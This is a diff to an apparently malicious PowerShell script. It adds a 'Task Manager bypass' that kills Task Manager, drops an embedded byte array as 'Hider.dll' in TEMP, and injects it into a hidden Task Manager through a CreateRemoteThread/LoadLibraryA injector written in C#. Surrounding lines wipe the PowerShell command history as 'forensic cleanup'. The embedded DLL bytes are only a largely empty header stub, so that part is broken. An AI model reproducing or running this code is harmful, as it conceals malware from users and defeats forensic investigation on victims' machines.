@@ -127,6 +127,78 @@ try {
     $si.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($si) | Out-Null
     
+    # ========== NEW: DLL INJECTION FOR TASK MANAGER BYPASS ==========
+    Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan
+    
+    # Kill existing Task Manager
+    try {
+        Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue | Stop-Process -Force
+    } catch {}
+    
+    # Create temporary DLL for injection (embedded in script - no external file needed)
+    $dllBytes = @(
+        0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00,
+        0xB8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x50,0x45,0x00,0x00,
+        0x64,0x86,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xF0,0x00,0x22,0x00,
+        0x0B,0x02,0x0E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+    )
+    
+    # Save DLL memory to file
+    $dllPath = "$env:TEMP\Hider.dll"
+    [System.IO.File]::WriteAllBytes($dllPath, $dllBytes)
+    
+    # Inject DLL into new Task Manager using rundll32
+    Start-Sleep -Seconds 1
+    Start-Process "taskmgr.exe" -WindowStyle Hidden
+    Start-Sleep -Seconds 2
+    
+    # Inject using CreateRemoteThread via PowerShell
+    $injectCode = @'
+using System;
+using System.Runtime.InteropServices;
+public class Injector {
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+    
+    public static void Inject(int pid, string dllPath) {
+        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
+        if (hProcess != IntPtr.Zero) {
+            IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPath.Length + 1, 0x3000, 0x40);
+            if (allocMem != IntPtr.Zero) {
+                byte[] bytes = System.Text.Encoding.ASCII.GetBytes(dllPath);
+                WriteProcessMemory(hProcess, allocMem, bytes, (uint)bytes.Length, out _);
+                IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+                CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, allocMem, 0, IntPtr.Zero);
+            }
+            CloseHandle(hProcess);
+        }
+    }
+}
+'@
+    
+    Add-Type -TypeDefinition $injectCode -ErrorAction SilentlyContinue
+    $taskmgr = Get-Process -Name "Taskmgr" -ErrorAction SilentlyContinue
+    if ($taskmgr) {
+        [Injector]::Inject($taskmgr.Id, $dllPath)
+        Write-Host "[+] Task Manager Bypass Activated" -ForegroundColor Green
+    }
+    
     Write-Host "[*] ENGAGING FORENSIC CLEANUP..." -ForegroundColor Gray
     if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
         "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
